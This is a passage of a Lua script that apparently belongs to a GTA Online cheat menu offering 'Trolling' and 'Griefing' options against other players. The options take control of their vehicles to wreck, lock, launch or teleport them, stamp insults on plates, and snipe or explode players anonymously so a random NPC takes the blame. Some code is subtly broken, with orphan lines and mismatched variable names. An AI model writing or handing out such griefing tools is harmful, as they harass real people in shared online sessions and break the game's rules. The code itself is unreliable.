        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-2, 2)
        coords_ped.y = coords_ped.y + math.random(-2, 2)
        coords_ped.z = coords_ped.z

        ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
		ENTITY.SET_ENTITY_VISIBLE(ped, false)
		--notification("Spawned [" .. ped_name .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), colors.red)
		--util.yield(15000)
		--entities.delete_by_handle(ped)
		----notification("Deleted [" .. ped_name .. "]", true, false)
	end

	vehopts = menu.list(menu.player_root(pid), "Vehicle Events", {}, "Works only if you are standing near to selected player", function(); end)
	lock_sub_vehicle_tab = menu.list(vehopts, "Lock Options", {}, "", function(); end)
	mov_sub_vehicle_tab = menu.list(vehopts, "Movement Options", {}, "", function(); end)
	troll_sub_vehicle_tab = menu.list(vehopts, "Trolling Options", {}, "", function(); end)
	health_sub_vehicle_tab = menu.list(vehopts, "Health and Appearance Options", {}, "", function(); end)
	detach_sub_vehicle_tab = menu.list(vehopts, "Detach Options", {}, "", function(); end)
	plane_sub_vehicle_tab = menu.list(vehopts, "Plane and Helicopter Options", {}, "", function(); end)

	menu.action(health_sub_vehicle_tab,"Repair Vehicle", {"fixveh"}, "Repairs player's vehicle", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)


	menu.action(vehopts,"Spawn them a vehicle", {}, "Spawns a vehicle on target player", function()
		menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
		--notification("now type the name of the vehicle in the command box", colors.red)
    end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.toggle_loop(troll_sub_vehicle_tab,"Fuck up all cars", {"fuckupallcars"}, "Beats the SHIT out of all nearby cars. But this damage is only local.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.SET_VEHICLE_DAMAGE(veh, math.random(-5.0, 5.0), math.random(-5.0, 5.0), math.random(-5.0,5.0), 200.0, 10000.0, true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle_loop(troll_sub_vehicle_tab,"Honk all cars", {"honkallcars"}, "Honkss the SHIT out of all nearby cars.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle_loop(troll_sub_vehicle_tab,"Blow up all cars", {"Blow up all cars"}, "Blows the SHIT out of all nearby cars.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, true, false, 1.0)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle(troll_sub_vehicle_tab, "Stealth Remote Control", {"stealthremote"}, "Enters there vehicle without them knowing and exits the same way. Note: It will disable them using that car until spawned again.", function(on_toggle)
	if on_toggle then
		menu.trigger_commands("tpmyspot")
		menu.trigger_commands("invisibility" .. " On")
                  	menu.trigger_commands("otr")
		menu.trigger_commands("tpveh" .. players.get_name(pid))
		menu.trigger_commands("rc" .. " On")
	else
                  	menu.trigger_commands("otr")
		menu.trigger_commands("rc" .. " Off")
		menu.trigger_commands("undoteleport")
		menu.trigger_commands("invisibility" .. " Off")
		end
	end)

    --[[
    
    menu.action(troll_sub_vehicle_tab, "Spawn Ramp in Front of them", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        STREAMING.REQUEST_MODEL(ramp_hash)
    	while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
    		util.yield()
    	end
        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)
        ENTITY.SET_ENTITY_VISIBLE(ramp, false)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(1000)
        entities.delete_by_handle(ramp)
    end)

    ]]
    
    menu.toggle_loop(troll_sub_vehicle_tab, "Glitch Vehicle", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("p_spinning_anus_s")
        STREAMING.REQUEST_MODEL(glitch_hash)
        while not STREAMING.HAS_MODEL_LOADED(glitch_hash) do
            util.yield()
        end
        if not PED.IS_PED_IN_VEHICLE(player, PED.GET_VEHICLE_PED_IS_IN(player), false) then
            util.toast("Player isn't in a vehicle. :/")
            return
        end
        glitched_object = entities.create_object(glitch_hash, playerpos)
        ENTITY.SET_ENTITY_VISIBLE(glitched_object, false)
        ENTITY.SET_ENTITY_INVINCIBLE(glitched_object, true)
        ENTITY.SET_ENTITY_COLLISION(glitched_object, true, true)
        util.yield(100)
        entities.delete_by_handle(glitched_object)
        util.yield()
    end)

    local plates = menu.list(troll_sub_vehicle_tab, "Fuck Plates", {}, "")

	menu.action(plates,"Addict Plate Text", {"Addictplate"}, "Addictplate", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "Addict")
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plates,"TRUMP Plate Text", {"trumpplate"}, "Sets player's vehicle plate text to TRUMP", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "TRUMP") 
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plates,"TRASH Plate Text", {"trashplate"}, "Sets player's vehicle plate text to TRASH", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "TRASH")
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plates,"Bitch Plate Text", {"bitchplate"}, "Sets player's vehicle plate text to Bitch", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "Bitch")
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(troll_sub_vehicle_tab, "Honk", {"honk"}, "", function()
	local vehicle = get_player_veh(pid,true)
	if vehicle then
            			VEHICLE.START_VEHICLE_HORN(vehicle, 50000, 0)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(troll_sub_vehicle_tab, "Sound Car Alarm", {"soundalarm"}, "", function()
	local vehicle = get_player_veh(pid,true)
	if vehicle then
            			VEHICLE.SET_VEHICLE_ALARM(vehicle, true)
            			VEHICLE.START_VEHICLE_ALARM(vehicle)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(health_sub_vehicle_tab,"Repair Vehicle Shell", {"repair"}, "Repairs player's vehicle but don't repair it's engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle)
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(health_sub_vehicle_tab,"Quick Upgrade Vehicle", {"ugveh"}, "Note: Spam it if don't work first time. Upgrades player's vehicle.",function()
		upgrade_vehicle(pid)
		upgrade_vehicle(pid)
        upgrade_vehicle(pid)
        upgrade_vehicle(pid)
		upgrade_vehicle(pid)
        upgrade_vehicle(pid)
        upgrade_vehicle(pid)
		upgrade_vehicle(pid)
        upgrade_vehicle(pid)
        upgrade_vehicle(pid)
    end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.toggle_loop(health_sub_vehicle_tab,"Disable Invincibility", {"removeinv"}, "Removes invincibility from player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
            util.yield(1000)
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(health_sub_vehicle_tab,"Enable Invincibility", {"giveinv"}, "Gives invincibility to player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true) 
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.toggle_loop(health_sub_vehicle_tab,"Destroy Engine", {"killveh"}, "Destroys vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, -4000)
            util.yield(1000)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(health_sub_vehicle_tab,"Revive Engine", {"reviveh"}, "Revives vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, 1000)
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.toggle_loop(health_sub_vehicle_tab,"Explode Vehicle", {"explodeveh"}, "Explodes vehicle",function()
		local vehicle = get_player_veh(pid,false)
		if vehicle then
			--local pos = ENTITY.GET_ENTITY_COORDS(vehicle)--tried around with EXPLODE_VEHICLE but didnt work mayb im just rarted
			--FIRE.ADD_EXPLOSION(pos.x,pos.y,pos.z, 7, 1000, true, false, 1, false)
			VEHICLE.ADD_VEHICLE_PHONE_EXPLOSIVE_DEVICE(vehicle)
			VEHICLE.DETONATE_VEHICLE_PHONE_EXPLOSIVE_DEVICE()
            util.yield(1000)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(mov_sub_vehicle_tab,"Boost", {"giveboost"}, "Sets max speed of vehicle to 100 better for cars",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 100) 
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(mov_sub_vehicle_tab,"Addict boost", {"Addictboosts"}, "Sets max speed of vehicle to 9999999 better for bikes",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(mov_sub_vehicle_tab,"Trash Speed", {"trashaccs"}, "Sets max speed of vehicle to INT_MIN",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, -2147483647) 
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(mov_sub_vehicle_tab, 'Reverse Car', {'reversecars'}, "Note: Restart Addict Script if you need to reset your own speed",function()
        --notification("Reverse Car On " .. PLAYER.GET_PLAYER_NAME(pids), colors.green)
	    local vehicle = get_player_veh(pid,true)
        local player_torques = 1000000
            player_torques = value
            util.create_tick_handler(function()
            if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
            local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
            VEHICLE.SET_VEHICLE_CHEAT_POWER_INCREASE(playerVehicle, player_torque/1000000)
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, -2147483647)
            util.toast("Restart Addict Script To Reset Your Own Speed")
            end
            return (player_torques ~= 1000000)
        end)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(mov_sub_vehicle_tab,"Reset Speed", {"resetaccs"}, "Resets max speed of vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 1) 
		end
    end, nil, nil, COMMANDPERM_FRIENDLY)
		
	menu.action(mov_sub_vehicle_tab,"East", {"eastveh"}, "Boosts player's vehicle in the East direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 10000, 0, 0, true, false, true)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(mov_sub_vehicle_tab,"West", {"westveh"}, "Boosts player's vehicle in the West direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, -10000, 0, 0, true, false, true)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(mov_sub_vehicle_tab,"South", {"southveh"}, "Boosts player's vehicle in the South direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, -10000, 0, true, false, true)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(mov_sub_vehicle_tab,"North", {"northveh"}, "Boosts player's vehicle in the North direction",function()
		northp_vehicle(pid)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(mov_sub_vehicle_tab,"Bounce Up", {"bounceup"}, "Shoots player up",function()
		bounce_vehicle(pid)
        util.yield(1000)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(mov_sub_vehicle_tab,"Launch Up", {"launchup"}, "Shoots player up",function()
		launch_vehicle(pid)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(mov_sub_vehicle_tab,"Launch Down", {"launchdown"}, "Shoots player down",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, -10000, true, false, true)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	---menu.action(main,"delete vehicle", {"delveh"}, "Deletes player's vehicle",function() <-- help
	---	local vehicle = get_player_veh(pid,true)
	---	if vehicle then
	---		VEHICLE.SET_ENTITY_AS_MISSION_ENTITY(vehicle, true, true)
	---		VEHICLE.DELETE_VEHICLE(vehicle) 
	---	end
	---end)

	menu.action(detach_sub_vehicle_tab,"Detach Trailer", {"detachtrailer"}, "Detaches attached trailer",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_TRAILER(vehicle)
            VEHICLE.DETACH_VEHICLE_FROM_TRAILER(vehicle) 
            VEHICLE.DETACH_VEHICLE_FROM_TRAILER(vehicle) 
            VEHICLE.DETACH_VEHICLE_FROM_TRAILER(vehicle) 
            VEHICLE.DETACH_VEHICLE_FROM_TRAILER(vehicle) 
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(detach_sub_vehicle_tab,"Detach from Cargobob", {"detachcbob"}, "Detaches from Cargobob",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(vehicle)
            VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(vehicle)
            VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(vehicle)
            VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(vehicle)
            VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(vehicle)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(lock_sub_vehicle_tab,"Lock Doors", {"lockveh"}, "Locks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(lock_sub_vehicle_tab,"Unlock Doors", {"unlockveh"}, "Unlocks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Drivable", {"engineon"}, "Makes player's vehicle drivable again",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, false)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Undrivable", {"engineoff"}, "Makes player's vehicle undrivable",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, true)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plane_sub_vehicle_tab,"Deploy Landing Gear", {"landing1"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 0)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plane_sub_vehicle_tab,"Retract Landing Gear", {"landing0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 3)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plane_sub_vehicle_tab,"Disable Cargobob's Hook", {"nohook"}, "Disables cargobob's hook. when used, that cargobob's hook will no longer work",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.REMOVE_PICK_UP_ROPE_FOR_CARGOBOB(vehicle)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plane_sub_vehicle_tab,"Strong Turbulence", {"turb1"}, "Makes turbulence stronger",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 1.0)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plane_sub_vehicle_tab,"No Turbulence", {"turb0"}, "Makes turbulence weaker",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 0.0)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 100%", {"propel100"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 1.0)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 0%", {"propel0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 0.0)		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(plane_sub_vehicle_tab,"Stop Propeller Blades", {"stopheli"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
            VEHICLE.SET_HELI_BLADES_SPEED(vehicle, -9999999)
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(lock_sub_vehicle_tab,"Lock that bitch in", {"lockcar"}, "Locks the doors, paints the car Hot Pink, changes plate text to 'LOCKED'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 135, 135)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LOCKED")
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(lock_sub_vehicle_tab,"Release that bitch out", {"bunlockcar"}, "Unlocks the doors, paints the vehicle Green, changes plate text to 'URFREE'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 92, 92)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "URFREE")		
		end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)


	menu.action(mov_sub_vehicle_tab,"Teleport to me", {"tp2me"}, "Teleport player's vehicle to you (Better to spectate first)",function()
		local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
		tp_veh_to(pid,coords.x,coords.y,coords.z)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(mov_sub_vehicle_tab,"Teleport to ocean", {"tp2sea"}, "Tries to teleport player's vehicle to the ocean",function()	
		tp_veh_to(pid, -15000, -15000,0)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    local function spawn_object_in_front_of_ped(ped, hash, ang, room, zoff, setonground)
        coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, room, zoff)
        request_model_load(hash)
        hdng = ENTITY.GET_ENTITY_HEADING(ped)
        new = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.SET_ENTITY_HEADING(new, hdng+ang)
        if setonground then
            OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(new)
        end
        return new
    end

read_global = {
	byte = function(global)
		local address = memory.script_global(global)
		return memory.read_byte(address)
	end,
	int = function(global)
		local address = memory.script_global(global)
		return memory.read_int(address)
	end,
	float = function(global)
		local address = memory.script_global(global)
		return memory.read_float(address)
	end,
	string = function(global)
		local address = memory.script_global(global)
		return memory.read_string(address)
	end
}

    function is_player_active(player, isPlaying, inTransition)
        if player == -1 or
        not NETWORK.NETWORK_IS_PLAYER_ACTIVE(player) then
            return false
        end
        if isPlaying and not PLAYER.IS_PLAYER_PLAYING(player) then
            return false
        end
        return true
    end

    function get_random_ped()
        peds = entities.get_all_peds_as_handles()
        npcs = {}
        valid = 0
        for k,p in pairs(peds) do
            if p ~= nil and not is_ped_player(p) then
                table.insert(npcs, p)
                valid = valid + 1
            end
        end
        return npcs[math.random(valid)]
    end
    
    function DELETE(ent)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, true, true)
        entities.delete_by_handle(ent)
    end

	griefing = menu.list(menu.player_root(pid), "Griefing", {}, "", function(); end)

    Owned_Anon = menu.list(griefing, "Owned & Anon", {"o&a"}, "", function(); end)

    Owned_Anon_Snipe = menu.list(Owned_Anon, "Snipe", {}, "", function(); end)

    menu.divider(Owned_Anon_Snipe, "Owned & Anon")

    menu.action(Owned_Anon_Snipe, "Owned snipe", {"osnipe"}, "Snipes the player with you as the attacker [Will not work if you do not have LOS with the target]. Maybe patched now.", function(on_click)
        owner = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        target = ENTITY.GET_ENTITY_COORDS(target_ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z']+0.1, 300.0, true, 100416529, owner, true, false, 100.0)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(Owned_Anon_Snipe, "Anon snipe", {"asnipe"}, "Snipes the player anonymously, as if a random ped did it [The randomly selected ped needs to have LOS, I think].", function(on_click)
        target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        target = ENTITY.GET_ENTITY_COORDS(target_ped)
        random_ped = get_random_ped()
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z']+0.1, 300.0, true, 100416529, random_ped, true, false, 100.0)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.divider(Owned_Anon_Snipe, "Owned & Anon Looped")

    menu.toggle_loop(Owned_Anon_Snipe, "Owned snipe", {"osnipel"}, "Snipes the player with you as the attacker [Will not work if you do not have LOS with the target]. Maybe patched now.", function(on_click)
        owner = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        target = ENTITY.GET_ENTITY_COORDS(target_ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z']+0.1, 300.0, true, 100416529, owner, true, false, 100.0)
    end)

    menu.toggle_loop(Owned_Anon_Snipe, "Anon snipe", {"asnipel"}, "Snipes the player anonymously, as if a random ped did it [The randomly selected ped needs to have LOS, I think].", function(on_click)
        target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        target = ENTITY.GET_ENTITY_COORDS(target_ped)
        random_ped = get_random_ped()
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z']+0.1, 300.0, true, 100416529, random_ped, true, false, 100.0)
    end)

    Owned_Anon_Explode = menu.list(Owned_Anon, "Explode", {}, "", function(); end)

    menu.divider(Owned_Anon_Explode, "Owned & Anon")

    menu.action(Owned_Anon_Explode, "Owned Explode", {"oexplode"}, "Explode the player.", function() --owned exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, c.z, exp, 100.0, true, false, 1.0)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(Owned_Anon_Explode, "Anon Explode", {"aexplode"}, "Explode the player anonymously.", function() --anon exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.divider(Owned_Anon_Explode, "Owned & Anon Loop")

    menu.toggle_loop(Owned_Anon_Explode, "Owned Explode Loop", {"oexplodel"}, "Explode the player looped.", function() --owned exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, c.z, exp, 100.0, true, false, 1.0)
    end)

    menu.toggle_loop(Owned_Anon_Explode, "Anon Explode Loop", {"aexplodel"}, "Explode the player anonymously looped.", function() --anon exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

        menu.toggle_loop(Owned_Anon_Explode,"Anon Mssile", {"amissile"}, "", function(on)
        local ped = 2459507570
        STREAMING.REQUEST_MODEL(ped)
        while not STREAMING.HAS_MODEL_LOADED(ped) do
            wait(100)
        end
        local lazer = 3013282534
        STREAMING.REQUEST_MODEL(lazer)
        while not STREAMING.HAS_MODEL_LOADED(lazer) do
            wait(100)
        end
